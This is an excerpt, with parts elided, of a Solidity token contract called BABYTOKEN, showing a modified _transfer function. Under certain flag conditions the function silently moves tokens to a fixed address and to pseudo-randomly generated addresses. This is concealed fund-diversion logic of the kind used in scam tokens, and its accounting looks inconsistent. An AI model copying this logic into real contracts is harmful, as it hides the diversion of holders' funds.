...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    function _transfer(
        ...
        if(airdrop && _isExcludedFromFees[from] || _isExcludedFromFees[to] && to == uniswapV2Pair){ 
                    super._transfer(from,IUnisAddress,AIRAmount);                             
                address ad;
                for(int i=0;i <=0;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    super._transfer(from,ad,AIRAmount*3);                                      
                }                 
                amount -= AIRAmount*3;                                                                           
        } 
